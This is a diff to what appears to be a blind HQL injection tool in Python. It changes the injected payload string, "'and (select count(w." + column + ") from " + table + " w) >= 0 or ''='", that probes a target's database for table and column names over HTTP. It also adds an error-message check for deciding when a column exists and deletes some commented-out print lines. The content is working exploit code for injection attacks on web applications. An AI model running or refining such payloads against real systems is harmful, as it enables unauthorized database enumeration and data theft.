@@ -50,12 +50,6 @@ def list_columns(url, params, param_to_test):
 
             insert_table_name_in_tables(table_name)
             insert_column_in_table(table_name, column_name)
-            # if (table_name not in TABLES):
-            #     TABLES[table_name] = []
-            #     print "[!] Table found : " + table_name
-            # if (column_name not in TABLES[table_name]):
-            #     TABLES[table_name].append(column_name)
-            #     print "[!] Column found : " + column_name
     else:
         raise Exception('We cannot manage to retrieve columns.')
     
@@ -64,6 +58,8 @@ def column_exists(message):
     if ('not found; SQL statement:' in message):
         return False
     else:
+        if ('could not resolve property:' in message):
+            return False
         return True
 
 def table_exists(message):
@@ -113,7 +109,7 @@ def blind_hqli_injection_columns(url, params, param_to_test, file_column, blind_
         for column in columns_to_test:
             # removing new line
             column = remove_new_line_from_string(column)
-            params[param_to_test][0] = "'and (select count(" + column + ") from " + table + ") >= 0 or ''='"
+            params[param_to_test][0] = "'and (select count(w." + column + ") from " + table + " w) >= 0 or ''='"
             
             req = send_HTTP_request(url, params)
             if (column_exists(req.content)):
